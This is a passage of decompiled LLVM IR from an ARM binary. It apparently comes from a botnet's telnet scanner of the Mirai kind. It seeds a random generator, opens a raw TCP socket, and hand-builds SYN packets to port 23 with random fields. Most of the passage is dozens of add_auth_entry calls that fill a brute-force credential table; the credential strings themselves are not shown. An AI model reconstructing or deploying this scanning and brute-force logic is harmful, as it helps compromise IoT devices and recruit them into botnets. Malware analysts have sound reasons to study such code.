  store i32 %v0_ff2c, i32* @global_var_26e50.101, align 4
  %v1_ff38 = call i32 @rand_init(i32 %v0_ff2c)
  %v0_ff3c = load i32, i32* @r4, align 4
  store i32 %v0_ff3c, i32* %r0.global-to-local, align 4
  %v1_ff40 = inttoptr i32 %v0_ff3c to i32*
  %v2_ff40 = call i32 @__GI_time(i32* %v1_ff40)
  store i32 ptrtoint (i32* @global_var_24388.186 to i32), i32* %r2.global-to-local, align 4
  store i32 544, i32* %r1.global-to-local, align 4
  store i32 %v2_ff40, i32* @global_var_24388.186, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_ff54 = call i32 @calloc(i32 256, i32 544)
  store i32 ptrtoint (i32* @global_var_26e6c.197 to i32), i32* %r3.global-to-local, align 4
  %v0_ff5c = load i32, i32* @r4, align 4
  store i32 %v0_ff5c, i32* %stack_var_-52, align 4
  store i32 %v2_ff54, i32* @global_var_26e6c.197, align 4
  store i32 %v0_ff5c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ff68

dec_label_pc_ff68:                                ; preds = %dec_label_pc_ff68.dec_label_pc_ff68_crit_edge, %dec_label_pc_ff2c
  %v2_ff74 = phi i32 [ %v2_ff74.pre, %dec_label_pc_ff68.dec_label_pc_ff68_crit_edge ], [ %v2_ff54, %dec_label_pc_ff2c ]
  %v0_ff7c = phi i32 [ %v0_ffac, %dec_label_pc_ff68.dec_label_pc_ff68_crit_edge ], [ %v0_ff5c, %dec_label_pc_ff2c ]
  %v3_ff70 = mul i32 %v0_ff7c, 512
  store i32 %v3_ff70, i32* %ip.global-to-local, align 4
  store i32 %v2_ff74, i32* @lr, align 4
  %v2_ff84 = mul i32 %v0_ff7c, 544
  %v1_ff8c = add i32 %v0_ff7c, 1
  store i32 %v1_ff8c, i32* %r0.global-to-local, align 4
  %v2_ff90 = add i32 %v2_ff84, %v2_ff74
  store i32 %v2_ff90, i32* %r2.global-to-local, align 4
  store i32 %v2_ff90, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_ffa4 = add i32 %v2_ff90, 4
  %v3_ffa4 = inttoptr i32 %v2_ffa4 to i32*
  store i32 -1, i32* %v3_ffa4, align 4
  %v0_ffa8 = load i32, i32* @r5, align 4
  %v1_ffa8 = load i32, i32* %r1.global-to-local, align 4
  %v2_ffa8 = add i32 %v1_ffa8, 12
  %v3_ffa8 = inttoptr i32 %v2_ffa8 to i32*
  store i32 %v0_ffa8, i32* %v3_ffa8, align 4
  %v0_ffac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ffac, i32* %stack_var_-52, align 4
  %v7_ffb0 = icmp sgt i32 %v1_ff8c, 255
  br i1 %v7_ffb0, label %dec_label_pc_ffb4, label %dec_label_pc_ff68.dec_label_pc_ff68_crit_edge

dec_label_pc_ff68.dec_label_pc_ff68_crit_edge:    ; preds = %dec_label_pc_ff68
  %v2_ff74.pre = load i32, i32* @global_var_26e6c.197, align 4
  br label %dec_label_pc_ff68

dec_label_pc_ffb4:                                ; preds = %dec_label_pc_ff68
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_ffc0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_ffc0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26e70.199 to i32), i32* %r2.global-to-local, align 4
  %v2_ffc8 = icmp eq i32 %v3_ffc0, -1
  store i1 %v2_ffc8, i1* %cpsr_c.global-to-local, align 1
  %v7_ffc8 = icmp eq i32 %v3_ffc0, -1
  store i1 %v7_ffc8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ffc0, i32* @r4, align 4
  store i32 %v3_ffc0, i32* @global_var_26e70.199, align 4
  br i1 %v7_ffc8, label %dec_label_pc_10980, label %dec_label_pc_ffd8

dec_label_pc_ffd8:                                ; preds = %dec_label_pc_ffb4
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_ffdc = load i32, i32* @r5, align 4
  store i32 %v0_ffdc, i32* @r2, align 4
  %v2_ffe0 = call i32 @__libc_fcntl(i32 %v3_ffc0, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_ffe8 = or i32 %v2_ffe0, 2048
  store i32 %v1_ffe8, i32* @r2, align 4
  %v0_ffec = load i32, i32* @r4, align 4
  store i32 %v0_ffec, i32* %r0.global-to-local, align 4
  %v2_fff0 = call i32 @__libc_fcntl(i32 %v0_ffec, i32 4)
  %v2_fff8 = load i32, i32* @global_var_26e70.199, align 4
  store i32 %v2_fff8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_10004 = load i32, i32* @r5, align 4
  store i32 %v0_10004, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_1000c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1000c, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_1001c = call i32 @__GI_setsockopt(i32 %v2_fff8, i32 %v0_10004, i32 3, i32 %v2_1000c, i32 4)
  store i32 %v5_1001c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10020 = icmp eq i32 %v5_1001c, 0
  store i1 %v2_10020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10020, label %dec_label_pc_10028, label %dec_label_pc_10974

dec_label_pc_10028:                               ; preds = %dec_label_pc_ffd8, %dec_label_pc_10028
  %v0_10028 = call i32 @rand_next()
  %v1_10034 = urem i32 %v0_10028, 256
  store i32 %v1_10034, i32* %r3.global-to-local, align 4
  %tmp340 = udiv i32 %v0_10028, 256
  %v3_10038 = urem i32 %tmp340, 256
  %v4_1003c = mul nuw nsw i32 %v1_10034, 256
  %v5_1003c = or i32 %v4_1003c, %v3_10038
  store i32 %v5_1003c, i32* %r0.global-to-local, align 4
  %v2_10040 = icmp ugt i32 %v5_1003c, 1023
  store i1 %v2_10040, i1* %cpsr_c.global-to-local, align 1
  %v7_10040 = icmp eq i32 %v5_1003c, 1024
  store i1 %v7_10040, i1* %cpsr_z.global-to-local, align 1
  %v3_10048 = icmp ult i32 %v5_1003c, 1022
  br i1 %v3_10048, label %dec_label_pc_10028, label %dec_label_pc_1004c

dec_label_pc_1004c:                               ; preds = %dec_label_pc_10028
  %v5_10044.le = trunc i32 %v0_10028 to i16
  store i32 ptrtoint (i8** @global_var_24358.201 to i32), i32* %r0.global-to-local, align 4
  %v2_10050 = load i8, i8* bitcast (i8** @global_var_24358.201 to i8*), align 4
  %v3_10050 = zext i8 %v2_10050 to i32
  %v1_10054 = and i32 %v3_10050, 240
  %v1_10058 = or i32 %v1_10054, 5
  store i32 %v1_10058, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_24358.201 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_2435a.202 to i16*), align 4
  %v0_10078 = call i32 @rand_next()
  %v1_10078 = trunc i32 %v0_10078 to i16
  %v3_10080 = load i8, i8* @global_var_24378.205, align 1
  store i32 ptrtoint (i16* @global_var_2436c.204 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_24358.201 to i32), i32* %ip.global-to-local, align 4
  %tmp = urem i8 %v3_10080, 16
  %v1_1008c = zext i8 %tmp to i32
  %v1_10090 = or i32 %v1_1008c, 80
  store i32 %v1_10090, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r4, align 4
  store i8 64, i8* bitcast (i32* @global_var_24360.206 to i8*), align 4
  store i16 %v1_10078, i16* bitcast (i32* @global_var_2435c.207 to i16*), align 4
  %v1_100a4 = trunc i32 %v1_10090 to i8
  store i8 %v1_100a4, i8* @global_var_24378.205, align 1
  store i8 6, i8* bitcast (i32* @global_var_24361.208 to i8*), align 4
  %v4_100ac = sext i16 %v5_10044.le to i32
  store i32 %v4_100ac, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_2436e.209, align 2
  store i16 %v5_10044.le, i16* @global_var_2436c.204, align 2
  %v0_100bc = call i32 @rand_next()
  %v1_100bc = trunc i32 %v0_100bc to i16
  %v3_100c4 = load i8, i8* @global_var_24379.210, align 1
  %v4_100c4 = zext i8 %v3_100c4 to i32
  store i32 ptrtoint (i16* @global_var_2436c.204 to i32), i32* %ip.global-to-local, align 4
  %v1_100cc = or i32 %v4_100c4, 2
  store i32 %v1_100cc, i32* %r3.global-to-local, align 4
  store i16 %v1_100bc, i16* bitcast (i32* @global_var_2437a.211 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_1b498.213 to i32), i32* %r1.global-to-local, align 4
  %v1_100d8 = trunc i32 %v1_100cc to i8
  store i8 %v1_100d8, i8* @global_var_24379.210, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_100e4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b498.213 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r1.global-to-local, align 4
  %v5_100f4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b49c.217 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10104 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b49c.217 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b514.219 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10114 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b514.219 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4a4.221 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10124 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b4a4.221 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4ac.223 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10134 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b4ac.223 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b498.213 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10144 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b498.213 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10154 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4b8.227 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_10164 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b4b8.227 to i32), i32 15)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4c0.229 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v4_10174 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b4c0.229 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b4c8.231 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10184 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b4c8.231 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4d0.233 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10194 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b4d0.233 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4dc.235 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_101a4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b4dc.235 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4e8.237 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_101b4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b4e8.237 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4f0.239 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_101c4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b4f0.239 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4fc.241 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_101d4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b4fc.241 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b508.243 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_101e4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b508.243 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b510.245 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_101f4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b510.245 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b518.247 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10204 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b518.247 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b520.249 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_10214 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b520.249 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b528.251 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10224 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b528.251 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b530.253 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10234 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b530.253 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b538.255 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_10244 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b538.255 to i32), i32 15)
  %v0_10248 = load i32, i32* @r4, align 4
  store i32 %v0_10248, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b540.257 to i32), i32* %r1.global-to-local, align 4
  %v5_10254 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b540.257 to i32), i32 %v0_10248)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10264 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b550.261 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_10274 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b550.261 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b558.263 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_10284 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b558.263 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b560.265 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10294 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b560.265 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b568.267 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_102a4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b568.267 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b570.269 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_102b4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b570.269 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b57c.271 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_102c4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b57c.271 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b588.273 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_102d4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b588.273 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b594.275 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_102e4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), i32 ptrtoint (i32* @global_var_1b594.275 to i32), i32 7)
  store i32 ptrtoint ([11 x i8]* @global_var_1b5a4.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5b0.279 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_102f4 = call i32 @add_auth_entry(i32 ptrtoint ([11 x i8]* @global_var_1b5a4.277 to i32), i32 ptrtoint (i32* @global_var_1b5b0.279 to i32), i32 2)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b550.261 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10304 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b550.261 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4a4.221 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10314 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b4a4.221 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10324 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4b8.227 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10334 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b4b8.227 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4c0.229 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10344 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b4c0.229 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4dc.235 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_10354 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b4dc.235 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5bc.281 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10364 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b5bc.281 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b570.269 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10374 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b570.269 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5c4.283 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10384 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b5c4.283 to i32), i32 5)
  store i32 ptrtoint ([14 x i8]* @global_var_1b5cc.285 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b404.287 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10394 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b5cc.285 to i32), i32 ptrtoint (i32* @global_var_1b404.287 to i32), i32 5)
  store i32 ptrtoint ([14 x i8]* @global_var_1b5dc.289 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_103a4 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b5dc.289 to i32), i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b5ec.291 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b5ec.291 to i32), i32* %r1.global-to-local, align 4
  %v5_103b4 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b5ec.291 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b5ec.291 to i32), i32 3)
  store i32 ptrtoint ([4 x i8]* @global_var_1b5f4.293 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b404.287 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_103c4 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b5f4.293 to i32), i32 ptrtoint (i32* @global_var_1b404.287 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r1.global-to-local, align 4
